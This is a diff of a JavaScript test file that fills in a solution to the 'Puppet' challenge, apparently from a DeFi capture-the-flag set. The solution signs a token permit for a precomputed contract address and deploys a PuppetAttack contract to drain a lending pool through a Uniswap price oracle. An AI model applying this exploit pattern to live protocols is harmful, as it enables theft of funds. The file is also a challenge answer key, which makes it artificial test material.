@@ -10,6 +10,56 @@ function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReser
   return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n)
 }
 
+async function getPermitSignature(wallet, token, spender, value, deadline) {
+  const [nonce, name, chainId] = await Promise.all([
+    token.nonces(wallet.address),
+    token.name(),
+    wallet.getChainId(),
+  ])
+
+  return ethers.utils.splitSignature(
+    await wallet._signTypedData(
+      {
+        name,
+        version: '1',
+        chainId,
+        verifyingContract: token.address,
+      },
+      {
+        Permit: [
+          {
+            name: 'owner',
+            type: 'address',
+          },
+          {
+            name: 'spender',
+            type: 'address',
+          },
+          {
+            name: 'value',
+            type: 'uint256',
+          },
+          {
+            name: 'nonce',
+            type: 'uint256',
+          },
+          {
+            name: 'deadline',
+            type: 'uint256',
+          },
+        ],
+      },
+      {
+        owner: wallet.address,
+        spender,
+        value,
+        nonce,
+        deadline,
+      },
+    ),
+  )
+}
+
 describe('[Challenge] Puppet', function () {
   let deployer, player
   let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool
@@ -91,7 +141,29 @@ describe('[Challenge] Puppet', function () {
   })
 
   it('Execution', async function () {
-    /** CODE YOUR SOLUTION HERE */
+    const PuppetAttackFactory = await ethers.getContractFactory('PuppetAttack', player)
+    const nonce = await ethers.provider.getTransactionCount(player.address)
+    const attackAddress = ethers.utils.getContractAddress({ from: player.address, nonce })
+    const deadline = (await ethers.provider.getBlock('latest')).timestamp + 300
+    const { v, r, s } = await getPermitSignature(
+      player,
+      token,
+      attackAddress,
+      PLAYER_INITIAL_TOKEN_BALANCE,
+      deadline,
+    )
+    await PuppetAttackFactory.deploy(
+      lendingPool.address,
+      uniswapExchange.address,
+      token.address,
+      PLAYER_INITIAL_TOKEN_BALANCE,
+      POOL_INITIAL_TOKEN_BALANCE,
+      deadline,
+      v,
+      r,
+      s,
+      { value: PLAYER_INITIAL_ETH_BALANCE - 1n * 10n ** 18n, gasLimit: 1e7 },
+    )
   })
 
   after(async function () {
